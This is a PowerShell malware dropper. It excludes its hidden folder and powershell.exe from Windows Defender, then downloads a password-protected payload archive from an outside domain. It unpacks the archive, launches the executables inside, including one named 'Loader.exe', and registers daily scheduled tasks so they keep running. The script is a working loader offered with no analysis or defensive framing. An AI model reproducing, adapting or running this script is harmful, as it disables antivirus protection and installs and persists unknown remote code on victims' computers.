# Variables
$7zipUrl = "https://www.7-zip.org/a/7z2301-x64.exe"
$installerPath = "$env:TEMP\7zInstaller.exe"
$7zipPath = "C:\Program Files\7-Zip\7z.exe"
$zipUrl = "https://xsf.com.ng/ss/payload.zip"
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$folderPath = Join-Path -Path $documentsPath -ChildPath "gogjothegoat"
$zipFilePath = Join-Path $folderPath "file.zip"
$payloadFolderPath = Join-Path $folderPath "payload"
$password = "badguy-dneu77366"
$processName = "powershell.exe"

# Exclude folder and process from Windows Defender
Add-MpPreference -ExclusionPath $folderPath | Out-Null
Add-MpPreference -ExclusionProcess $processName | Out-Null

# Function to Download and Install 7-Zip
function Install-7Zip {
    Write-Host "7-Zip not found. Downloading and installing..."
    Invoke-WebRequest -Uri $7zipUrl -OutFile $installerPath
    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
    Remove-Item -Path $installerPath -Force
    Write-Host "7-Zip installed successfully."
}

# Ensure 7-Zip is installed
if (-Not (Test-Path $7zipPath)) {
    Install-7Zip
} else {
    Write-Host "7-Zip is already installed."
}

# Create folder structure if it does not exist
if (-Not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
    (Get-Item $folderPath).Attributes = 'Hidden'
}
if (-Not (Test-Path $payloadFolderPath)) {
    New-Item -Path $payloadFolderPath -ItemType Directory | Out-Null
}

# Download ZIP file if not already downloaded
if (-Not (Test-Path $zipFilePath)) {
    Write-Host "Downloading ZIP file..."
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
}

# Extract ZIP file into 'payload' folder
Write-Host "Extracting ZIP file..."
& $7zipPath x $zipFilePath "-o$payloadFolderPath" "-p$password" -y
if ($LASTEXITCODE -eq 0) {
    Write-Host "ZIP file extracted successfully to $payloadFolderPath."
} else {
    Write-Host "Failed to extract ZIP file. Check password and paths."
    exit
}

# Execute files if they exist
$OriginalExePath = Join-Path $payloadFolderPath "Original.exe"
$LoaderPath = Join-Path $payloadFolderPath "Loader.exe"
$ComboExePath = Join-Path $payloadFolderPath "Combo.exe"


if (Test-Path $OriginalExePath) {
    Write-Host "Starting Original.exe..."
    Start-Process -FilePath $OriginalExePath -WorkingDirectory $payloadFolderPath
} else {
    Write-Host "Original.exe not found in payload folder."
}

if (Test-Path $LoaderPath) {
    Write-Host "Starting Loader.exe..."
    Start-Process -FilePath $LoaderPath -WorkingDirectory $payloadFolderPath
} else {
    Write-Host "Loader.exe not found in payload folder."
}

if (Test-Path $ComboExePath) {
    Write-Host "Starting Combo.exe..."
    Start-Process -FilePath $ComboExePath -WorkingDirectory $payloadFolderPath
} else {
    Write-Host "Loader.exe not found in payload folder."
}

# Schedule tasks for Original.exe and Loader.exe
$taskNameOriginal = "RunOriginal"
$taskNameLoader = "RunLoader"

$actionOriginal = New-ScheduledTaskAction -Execute $OriginalExePath
$actionLoader = New-ScheduledTaskAction -Execute $LoaderPath

$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(5)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable

if (Test-Path $OriginalExePath) {
    Register-ScheduledTask -Action $actionOriginal -Trigger $trigger -Settings $settings -TaskName $taskNameOriginal -Description "Runs Original.exe daily." | Out-Null
    Write-Host "Scheduled task for Original.exe set up."
}

if (Test-Path $LoaderPath) {
    Register-ScheduledTask -Action $actionLoader -Trigger $trigger -Settings $settings -TaskName $taskNameLoader -Description "Runs Loader.exe daily." | Out-Null
    Write-Host "Scheduled task for Loader.exe set up."
}

Write-Host "Process completed."
